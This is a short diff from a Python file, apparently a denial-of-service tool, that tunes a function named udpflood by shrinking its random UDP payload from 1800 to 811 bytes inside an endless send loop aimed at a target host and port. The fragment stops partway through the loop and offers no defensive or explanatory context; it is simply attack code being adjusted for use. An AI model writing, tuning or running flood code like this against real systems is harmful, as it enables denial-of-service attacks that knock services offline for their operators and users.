@@ -826,7 +826,7 @@ class JSv2(threading.Thread):
 def udpflood():
     global req_code, error
     tar = (str(host_ip),int(port))
-    bytes = random._urandom(1800) #1475 #1180
+    bytes = random._urandom(811) #1475 #1180
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
